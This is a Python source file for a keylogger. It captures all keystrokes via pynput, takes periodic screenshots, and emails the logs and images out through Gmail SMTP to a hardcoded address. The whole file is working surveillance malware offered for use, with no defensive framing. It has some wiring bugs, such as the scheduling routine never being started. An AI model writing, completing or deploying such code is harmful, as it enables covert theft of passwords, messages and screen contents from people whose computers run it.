import smtplib
from datetime import datetime
from pynput import keyboard
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading

# Configuration
EMAIL_ADDRESS = "your email"  # Use a dedicated account
EMAIL_PASSWORD = "......... "  # Use app-specific password
SEND_INTERVAL = 5 # Seconds between emails
SCREENSHOT_INTERVAL = 5
MAX_SCREENSHOTS = 100# Seconds between screenshots


class KeyLogger:
    def __init__(self):
        self.log = ""
        self.screenshot_count = 0
        self.start_dt = datetime.now()
        self.listener = None

    def on_press(self, key):
        try:
            # Capture all alphanumeric and symbol keys
            self.log += key.char
        except AttributeError:
            # Handle special keys
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n"
            elif key == keyboard.Key.backspace:
                self.log = self.log[:-1]  # Remove last character
            elif key == keyboard.Key.tab:
                self.log += " [TAB] "
            elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                self.log += " [SHIFT] "
            elif key == keyboard.Key.ctrl or key == keyboard.Key.ctrl_r:
                self.log += " [CTRL] "
            elif key == keyboard.Key.alt or key == keyboard.Key.alt_r:
                self.log += " [ALT] "
            elif key == keyboard.Key.esc:
                self.log += " [ESC] "
            elif key == keyboard.Key.caps_lock:
                self.log += " [CAPS_LOCK] "
            elif key == keyboard.Key.delete:
                self.log += " [DELETE] "
            elif key == keyboard.Key.up:
                self.log += " [UP_ARROW] "
            elif key == keyboard.Key.down:
                self.log += " [DOWN_ARROW] "
            elif key == keyboard.Key.left:
                self.log += " [LEFT_ARROW] "
            elif key == keyboard.Key.right:
                self.log += " [RIGHT_ARROW] "
            elif key == keyboard.Key.home:
                self.log += " [HOME] "
            elif key == keyboard.Key.end:
                self.log += " [END] "
            elif key == keyboard.Key.page_up:
                self.log += " [PAGE_UP] "
            elif key == keyboard.Key.page_down:
                self.log += " [PAGE_DOWN] "
            elif key == keyboard.Key.insert:
                self.log += " [INSERT] "
            else:
                self.log += f" [{key.name}] "

    def capture_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            filename = f"screenshot_{self.screenshot_count}.png"
            screenshot.save(filename)
            self.screenshot_count += 1
            return filename
        except Exception as e:
            print(f"Screenshot error: {str(e)}")

    def send_email(self, attachment=None):
        try:
            msg = MIMEMultipart()
            msg['From'] = EMAIL_ADDRESS
            msg['To'] = "iamsamir2220@gmail.com"
            msg['Subject'] = f"Keylog Report - {self.start_dt}"

            body = f"Keystroke log:\n{self.log}\n\n"
            msg.attach(MIMEText(body, 'plain'))

            if attachment:
                part = MIMEBase('application', 'octet-stream')
                with open(attachment, 'rb') as file:
                    part.set_payload(file.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename= {attachment}")
                msg.attach(part)

            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg.as_string())
            server.quit()

            self.log = ""  # Reset log after sending
        except Exception as e:
            print(f"Email error: {str(e)}")

    def schedule_tasks(self):
        screenshot_thread = threading.Timer(SCREENSHOT_INTERVAL, self.schedule_tasks)
        screenshot_thread.daemon = True
        screenshot_thread.start()

        email_thread = threading.Timer(SEND_INTERVAL, self.schedule_tasks)
        email_thread.daemon = True
        email_thread.start()

        attachment = self.capture_screenshot()
        self.send_email(attachment)

    def start(self):
        # Start keyboard listener
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

        # Keep the program running
        self.listener.join()


if __name__ == "__main__":
    logger = KeyLogger()

    logger.start()
